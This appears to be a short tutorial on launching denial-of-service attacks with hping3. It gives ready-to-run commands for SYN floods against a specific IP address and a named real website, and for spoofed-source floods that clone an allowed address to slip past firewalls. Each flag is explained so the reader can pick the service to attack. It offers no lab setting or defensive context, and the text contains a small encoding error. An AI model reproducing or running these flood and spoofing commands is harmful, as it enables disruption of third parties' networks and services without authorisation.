```
sudo apt install hping3 -y
```

A simple DOS (not DDOS) attack would be:
```
sudo hping3 -S --flood -V -p 80 170.155.9.185
```

sudo: gives needed privileges to run hping3.
hping3: calls hping3 program.
-S: specifies SYN packets.
â€“flood: replies will be ignored and packets will be sent as fast as possible.
-V: Verbosity.
-p 80: port 80, you can replace this number for the service you want to attack.
170.155.9.185: target IP.

Flood Using SYN Packets Against Port 80
SYN packets include the connection synchronization confirmation request.
The following example shows a SYN attack against lacampora.org:

```
sudo hping3 lacampora.org -q -n -d 120 -S -p 80 --flood --rand-source
```

Flood From a Fake IP Address With hping3
With hping3 you can also attack your targets with a fake IP. In order to bypass a firewall, you can even clone your target IP itself, or any allowed address you may know (you can achieve it for example with Nmap or a sniffer to listen to established connections).

The syntax is the following:
```
sudo hping3 -a <FAKE IP> <target> -S -q -p 80
```
In the example below, I replaced my real IP address with the IP 190.0.174.10.
```
sudo hping3 -a 190.0.174.10 190.0.175.100 -S -q -p 80
```
